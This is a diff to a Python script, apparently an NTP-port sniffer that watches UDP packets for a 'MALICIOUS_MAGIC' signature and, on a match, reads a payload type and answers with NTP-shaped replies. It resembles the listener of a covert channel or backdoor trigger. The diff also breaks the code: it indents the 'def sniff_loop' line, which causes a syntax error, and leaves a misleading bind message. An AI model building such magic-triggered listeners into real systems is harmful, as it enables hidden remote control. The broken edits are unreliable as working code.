@@ -233,7 +233,7 @@ def auto_detect_interface(target_range="10.10.10.0/24", timeout=5):
     return INTERFACE
 
 # === MAIN LOOP ===
-def sniff_loop(interface, filter_str, timeout=5):
+  def sniff_loop(interface, filter_str, timeout=5):
     sock = None  # Global socket for sniffing
     try:
         print(f"[+] Starting NTP Sniffer on {interface}...")
@@ -264,8 +264,8 @@ def sniff_loop(interface, filter_str, timeout=5):
                                 # Last resort: bind to interface IP
                                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
                                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                                sock.bind((ipaddress.IPv4Network("10.10.10.0/24").network_address, NTP_PORT))
-                                print(f"  [✓] Bound to network range: {sock.getsockname()[0]}:{NTP_PORT}")
+                                sock.bind((SERVER_HOST, NTP_PORT))
+                                print(f"  [✓] Bound to network range: {SERVER_HOST}:{NTP_PORT}")
                     else:
                         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
                         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -275,13 +275,19 @@ def sniff_loop(interface, filter_str, timeout=5):
                     sock.settimeout(timeout)
                     
                     # 3. Sniff packet
-                    packet = sock.recvfrom(65535)  # 64KB buffer
-                    ntp_pkt, src_ip = packet
+                    packet_bytes = sock.recvfrom(65535)  # 64KB buffer
+                    ntp_data, src_ip_tuple = packet_bytes
                     
-                    # 4. Check Magic Byte
-                    raw = scapy.raw(ntp_pkt)
-                    if raw[1:7] == MALICIOUS_MAGIC:
-                        # 5. Receive Payload Type
+                    # 4. Check Magic Byte (using raw bytes)
+                    if len(ntp_data) < 7:
+                        print(f"  [!] Packet too short: {len(ntp_data)} bytes")
+                        continue
+                    
+                    raw_magic = ntp_data[0:7]
+                    if raw_magic[1:7] == MALICIOUS_MAGIC:
+                        print(f"[+] Magic Signature Matched!")
+                        
+                        # 5. Receive Payload Type (Next 6 bytes)
                         connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                         connection.bind((SERVER_HOST, NTP_PORT))
                         
@@ -307,6 +313,7 @@ def sniff_loop(interface, filter_str, timeout=5):
                         
                         connection.send(pack_ntp_resp(MAGIC_BYTE, b"\x00"))
                     
+                # Inner except for socket errors
                 except socket.timeout:
                     print(f"[+] Timeout. Waiting for next packet...")
                     time.sleep(SLEEP)
@@ -317,6 +324,7 @@ def sniff_loop(interface, filter_str, timeout=5):
                     print(f"  [!] Sniff Packet Error: {e}")
                     time.sleep(SLEEP)
             
+            # Outer except for socket reconnection
             except socket.timeout:
                 print(f"[+] Outer Timeout. Waiting for next packet...")
                 time.sleep(SLEEP)
@@ -352,7 +360,7 @@ def sniff_loop(interface, filter_str, timeout=5):
                 print("[+] Socket closed.")
             except:
                 pass
-
+              
 def print_banner():
     print("""
    _____                 _                       
